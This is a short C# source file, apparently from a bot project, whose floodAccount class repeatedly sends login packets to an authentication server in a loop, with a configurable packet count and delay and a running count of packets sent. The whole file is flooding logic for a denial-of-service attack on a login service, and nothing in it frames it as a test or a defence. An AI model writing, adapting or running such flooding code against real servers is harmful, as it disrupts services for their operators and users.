using bot.config;
using bot.modal;
using bot.network.auth.client;
using System.Threading.Tasks;

namespace bot.network.auth.actions
{
    class floodAccount
    {
        public static ulong seq1 = 0;

        public async static void Start()
        {

            for (int i = 0; i < Config.packets; i++)
            {
                flooding.totalSend++;
                if (!AuthClient.Send(new BASE_LOGIN_REC()))
                    break;
                await Task.Delay(Config.sleep);
            }
        }
    }
}
